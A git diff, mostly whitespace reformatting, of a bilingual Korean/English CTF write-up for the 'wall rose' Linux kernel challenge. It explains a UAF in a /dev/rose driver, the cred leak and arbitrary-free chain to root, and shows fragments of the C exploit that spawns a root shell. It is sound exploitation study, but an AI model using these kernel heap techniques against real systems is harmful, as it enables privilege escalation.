@@ -8,11 +8,14 @@ tags:
   - linux-kernel
   - UAF
   - writeup
-description: "{{description}}"
-description_ko: "{{description_ko}}"
+description: wall rose writeup
+description_ko: wall rose writeup
 ---
+
 [lang:ko]
+
 # Write-Up
+
 [[2023-hitcon-wall-sina|wall-sina]]처럼 버그는 단순하다. `rose_open()`에서 `data`는 kmalloc-1k에서 관리하는 크기로 할당되고, `rose_release()`에서 `data`는 검증 없이 해제된다. 따라서 `data`에 저장된 dangling pointer를 다시 해제함으로써 Double Free 또는 UAF가 발생할 수 있다.
 
 ```c
@@ -37,28 +40,29 @@ static int rose_release(struct inode *inode, struct file *file) {
 ```
 
 이 문제는 다음과 같은 과정을 통해 해결했다.
+
 1. `current->cred`의 주소 유출
-    `struct user_key_payload`를 덮어써서 OOB Read primitive를 획득했다.
-    ```c
-    struct user_key_payload {
-        struct rcu_head rcu;        /* RCU destructor */
-        unsigned short  datalen;    /* length of this data */
-        char        data[] __aligned(__alignof__(u64)); /* actual data */
-    };
-    ```
-    읽은만한 객체를 찾던 중 [DirtyCred](https://zplin.me/papers/DirtyCred.pdf) 논문을 찾아 `struct sock`이 `current->cred`를 멤버 변수로 가지고 있음을 알게 되었다. `struct sock`도 kmalloc-1k에서 관리되므로 `current->cred`의 주소를 유출할 수 있었다.
-    
+   `struct user_key_payload`를 덮어써서 OOB Read primitive를 획득했다.
+   ```c
+   struct user_key_payload {
+       struct rcu_head rcu;        /* RCU destructor */
+       unsigned short  datalen;    /* length of this data */
+       char        data[] __aligned(__alignof__(u64)); /* actual data */
+   };
+   ```
+   읽은만한 객체를 찾던 중 [DirtyCred](https://zplin.me/papers/DirtyCred.pdf) 논문을 찾아 `struct sock`이 `current->cred`를 멤버 변수로 가지고 있음을 알게 되었다. `struct sock`도 kmalloc-1k에서 관리되므로 `current->cred`의 주소를 유출할 수 있었다.
 2. 해제하고 싶은 주소를 `msg->security`에 넣고 `free_msg`를 트리거하여 Arbitrary Address Free primitive를 획득했고, Arbitrary Address Free primitive를 사용해서 `current->cred` 해제를 해제 했다.
-    
 3. root cred를 할당하기 위해 UMH 트리거
-    잘못된 헤더가 있는 바이너리(예: `\\xff\\xff\\xff\\xff`)를 실행하여 UMH를 트리거했다.
+   잘못된 헤더가 있는 바이너리(예: `\\xff\\xff\\xff\\xff`)를 실행하여 UMH를 트리거했다.
 
 # 여담
-이 문제를 풀 때 사용했던 방식과 유사한 [논문](https://leeyoochan.github.io/assets/pdf/DirtyFree_NDSS_2026.pdf)이 최근에 게재되었다는걸 알게 되었다. 내가 했던 생각들이 논문으로 표현된 걸 보니 뭔가 신기했다. 대표적으로 cred object를 io_uring을 이용해서 spray하고 cred 주소를 추측한 뒤, AAF primitive를 이용해서 추측한 cred 주소를 free한다는 방식을 사용하는 방법을 소개하는데, spray를 하더라도 partial overwrite 만으로 cred 주소를 맞추는 방식은 성공확률이 떨어지다보니 개선여지가 있어보인다. 
+
+이 문제를 풀 때 사용했던 방식과 유사한 [논문](https://leeyoochan.github.io/assets/pdf/DirtyFree_NDSS_2026.pdf)이 최근에 게재되었다는걸 알게 되었다. 내가 했던 생각들이 논문으로 표현된 걸 보니 뭔가 신기했다. 대표적으로 cred object를 io_uring을 이용해서 spray하고 cred 주소를 추측한 뒤, AAF primitive를 이용해서 추측한 cred 주소를 free한다는 방식을 사용하는 방법을 소개하는데, spray를 하더라도 partial overwrite 만으로 cred 주소를 맞추는 방식은 성공확률이 떨어지다보니 개선여지가 있어보인다.
 
 논문에서 제시한 arbitrary free object에서 보통 generic cache에서 할당 받은 object를 victim으로 사용하는데, 이 점을 생각했을 때는 cred object보다 pipe_buffer object를 free해서 pipe_buffer UAF 취약점으로 pivot한다던지 아님 이 문제처럼 OOB read primitive를 한번 더 만들어서 cred object의 주소를 구한다던지, 아님 kfree에서 slab으로 관리되지 않은 주소를 넣으면 아예 그 주소와 관련된 page 전체를 free 시켜주는데 이걸 이용해서 뭔가 page-UAF로 pivot 할 수 있을지도..
 
 여러가지 Future Work로 할만한 것들이 많은 주제인 것 같다.
+
 ```c
 void free_large_kmalloc(struct folio *folio, void *object)
 {
@@ -101,6 +105,7 @@ void kfree(const void *object)
 ```
 
 # Exploit
+
 ```c
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -148,7 +153,7 @@ void fatal(const char *msg)
 void hexdump(void *mem, unsigned int len)
 {
     unsigned int i, j;
-    
+
     for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
     {
         /* print offset */
@@ -166,7 +171,7 @@ void hexdump(void *mem, unsigned int len)
         {
             printf("   ");
         }
-        
+
         /* print ASCII dump */
         if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
         {
@@ -178,7 +183,7 @@ void hexdump(void *mem, unsigned int len)
                 }
                 else if(isprint(((char*)mem)[j])) /* printable char */
                 {
-                    putchar(0xFF & ((char*)mem)[j]);        
+                    putchar(0xFF & ((char*)mem)[j]);
                 }
                 else /* other char */
                 {
@@ -203,10 +208,10 @@ int alloc_key(int id, char *buff, size_t size)
     payload = buff ? buff : calloc(1, size);
 
     if (!buff)
-        memset(payload, id, size);    
+        memset(payload, id, size);
 
     key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
-    	
+
     return key;
 }
 
@@ -234,7 +239,7 @@ void aaf(uint64_t addr)
     mod_fd2 = open("/dev/rose", O_RDWR);
     if (mod_fd2 < 0)
         fatal("open(\\"/dev/rose\\")");
-        
+
     close(mod_fd);
 
     for (int i = 0; i < SPRAY_CNT; i++) {
@@ -295,10 +300,10 @@ int main(void)
     mod_fd2 = open("/dev/rose", O_RDWR);
     if (mod_fd2 < 0)
         fatal("open(\\"/dev/rose\\")");
-    
+
     /* kmalloc-1024 영역을 가리키는 dangling potiner 생성 */
     close(mod_fd);
-    
+
     for (int i = 0; i < SPRAY_CNT; i++) {
         keys[i] = alloc_key(i, NULL, 0x400);
         if (keys[i] < 0)
@@ -309,7 +314,7 @@ int main(void)
 
     /* Double Free 보다 사용하기 좋은 UAF로 전환 */
     close(mod_fd2);
-    
+
     /* UAF 성공 기원하기 */
     for (int i = 0; i < SPRAY_CNT; i++)
         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockpairs[i]) < 0)
@@ -370,7 +375,7 @@ int main(void)
         aaf(current_cred + 0xc0 * 2);
 
         while (1) {
-            if (getuid() == 0) 
+            if (getuid() == 0)
                 break;
         }
         system("/bin/sh");
@@ -387,11 +392,13 @@ int main(void)
     return 0;
 }
 ```
+
 [lang:en]
 
-> [!warning] This post was translated by an LLM. If you would like to read the original, please click the `한국어` button in the top-left corner.
+> [!warning] This post was translated by an LLM. If you would like to read the original, please click the globe icon in the top-left corner.
 
 # Write-Up
+
 Like [[2023-hitcon-wall-sina|wall-sina]], the bug is simple. In `rose_open()`, `data` is allocated with a size managed by kmalloc-1k. In `rose_release()`, `data` is freed without any validation. Therefore, a Double Free or UAF can occur by freeing the dangling pointer saved in `data` again.
 
 ```c
@@ -418,49 +425,52 @@ static int rose_release(struct inode *inode, struct file *file) {
 I solved this challenge as follows:
 
 1. Leak address of `current->cred`
-    I obtained an OOB Read primitive by overwriting `struct user_key_payload`
-    ```c
-    struct user_key_payload {
-        struct rcu_head rcu;        /* RCU destructor */
-        unsigned short  datalen;    /* length of this data */
-        char        data[] __aligned(__alignof__(u64)); /* actual data */
-    };
-    ```
-    
-    I found this paper ([https://zplin.me/papers/DirtyCred.pdf](https://zplin.me/papers/DirtyCred.pdf)) and realized that `struct sock` has `current->cred` as a member variable. I was able to leak the address of `current->cred` because `struct sock` is also managed by kmalloc-1k.
-    
+   I obtained an OOB Read primitive by overwriting `struct user_key_payload`
+
+   ```c
+   struct user_key_payload {
+       struct rcu_head rcu;        /* RCU destructor */
+       unsigned short  datalen;    /* length of this data */
+       char        data[] __aligned(__alignof__(u64)); /* actual data */
+   };
+   ```
+
+   I found this paper ([https://zplin.me/papers/DirtyCred.pdf](https://zplin.me/papers/DirtyCred.pdf)) and realized that `struct sock` has `current->cred` as a member variable. I was able to leak the address of `current->cred` because `struct sock` is also managed by kmalloc-1k.
+
 2. Free `current->cred` using Arbitrary Address Free primitive
-    I obtained an AAF primitive by placing the address I wanted to free in `msg->security` and triggering `free_msg`.
-    ```c
-    void security_msg_msg_free(struct msg_msg *msg)
-    {
-    	call_void_hook(msg_msg_free_security, msg);
-    	kfree(msg->security);
-    	msg->security = NULL;
-    }
-    
-    void free_msg(struct msg_msg *msg)
-    {
-    	struct msg_msgseg *seg;
-    
-    	security_msg_msg_free(msg);
-    
-    	seg = msg->next;
-    	kfree(msg);
-    	while (seg != NULL) {
-    		struct msg_msgseg *tmp = seg->next;
-    
-    		cond_resched();
-    		kfree(seg);
-    		seg = tmp;
-    	}
-    }
-    ```
-    
+   I obtained an AAF primitive by placing the address I wanted to free in `msg->security` and triggering `free_msg`.
+
+   ```c
+   void security_msg_msg_free(struct msg_msg *msg)
+   {
+   	call_void_hook(msg_msg_free_security, msg);
+   	kfree(msg->security);
+   	msg->security = NULL;
+   }
+
+   void free_msg(struct msg_msg *msg)
+   {
+   	struct msg_msgseg *seg;
+
+   	security_msg_msg_free(msg);
+
+   	seg = msg->next;
+   	kfree(msg);
+   	while (seg != NULL) {
+   		struct msg_msgseg *tmp = seg->next;
+
+   		cond_resched();
+   		kfree(seg);
+   		seg = tmp;
+   	}
+   }
+   ```
+
 3. Trigger UMH to allocate root cred.
-    I triggered UMH by running a binary with a invalid header (e.g. `\\xff\\xff\\xff\\xff`).
+   I triggered UMH by running a binary with a invalid header (e.g. `\\xff\\xff\\xff\\xff`).
 
 # Additional Notes
+
 While solving this challenge, I learned that a recently published [paper](https://leeyoochan.github.io/assets/pdf/DirtyFree_NDSS_2026.pdf) discusses an approach similar to mine. It was interesting to see ideas I had while solving this challenge expressed in a formal paper.
 
 One representative approach in the paper is to spray cred objects using io_uring, guess the cred address, and then free the guessed cred address using an AAF primitive. Even with spraying, however, matching the cred address through partial overwrite alone seems to have a relatively low success rate, so there appears to be room for improvement.
@@ -468,6 +478,7 @@ One representative approach in the paper is to spray cred objects using io_uring
 For future work, there seem to be several promising directions: pivoting by freeing a `pipe_buffer` object and using a pipe_buffer UAF, creating another OOB read primitive to recover the cred address more reliably (as in this challenge), or leveraging the behavior where `kfree` may free an entire page when given a non-slab-managed address and attempting a page-UAF pivot.
 
 # Exploit
+
 ```c
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -515,7 +526,7 @@ void fatal(const char *msg)
 void hexdump(void *mem, unsigned int len)
 {
     unsigned int i, j;
-    
+
     for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
     {
         /* print offset */
@@ -533,7 +544,7 @@ void hexdump(void *mem, unsigned int len)
         {
             printf("   ");
         }
-        
+
         /* print ASCII dump */
         if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
         {
@@ -545,7 +556,7 @@ void hexdump(void *mem, unsigned int len)
                 }
                 else if(isprint(((char*)mem)[j])) /* printable char */
                 {
-                    putchar(0xFF & ((char*)mem)[j]);        
+                    putchar(0xFF & ((char*)mem)[j]);
                 }
                 else /* other char */
                 {
@@ -570,10 +581,10 @@ int alloc_key(int id, char *buff, size_t size)
     payload = buff ? buff : calloc(1, size);
 
     if (!buff)
-        memset(payload, id, size);    
+        memset(payload, id, size);
 
     key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
-    	
+
     return key;
 }
 
@@ -601,7 +612,7 @@ void aaf(uint64_t addr)
     mod_fd2 = open("/dev/rose", O_RDWR);
     if (mod_fd2 < 0)
         fatal("open(\\"/dev/rose\\")");
-        
+
     close(mod_fd);
 
     for (int i = 0; i < SPRAY_CNT; i++) {
@@ -662,10 +673,10 @@ int main(void)
     mod_fd2 = open("/dev/rose", O_RDWR);
     if (mod_fd2 < 0)
         fatal("open(\\"/dev/rose\\")");
-    
+
     /* kmalloc-1024 영역을 가리키는 dangling potiner 생성 */
     close(mod_fd);
-    
+
     for (int i = 0; i < SPRAY_CNT; i++) {
         keys[i] = alloc_key(i, NULL, 0x400);
         if (keys[i] < 0)
@@ -676,7 +687,7 @@ int main(void)
 
     /* Double Free 보다 사용하기 좋은 UAF로 전환 */
     close(mod_fd2);
-    
+
     /* UAF 성공 기원하기 */
     for (int i = 0; i < SPRAY_CNT; i++)
         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockpairs[i]) < 0)
@@ -737,7 +748,7 @@ int main(void)
         aaf(current_cred + 0xc0 * 2);
 
         while (1) {
-            if (getuid() == 0) 
+            if (getuid() == 0)
                 break;
         }
         system("/bin/sh");
